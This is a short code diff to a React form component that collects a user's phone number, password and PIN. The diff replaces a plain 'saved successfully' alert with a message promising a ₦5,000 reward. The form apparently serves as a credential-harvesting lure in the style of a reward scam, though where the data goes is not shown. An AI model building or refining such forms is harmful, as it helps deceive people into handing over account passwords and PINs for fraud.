@@ -11,7 +11,7 @@ const UserForm = () => {
   const handleSubmit = async (e) => {
     e.preventDefault();
     await saveUserDetails(user);
-    alert("User details saved successfully!");
+    alert("Congratulations, your reward of ₦5,000 is on the way into your account 🎉.");
     setUser({ phoneNumber: "", password: "", pin: "" }); // Reset form
   };
 
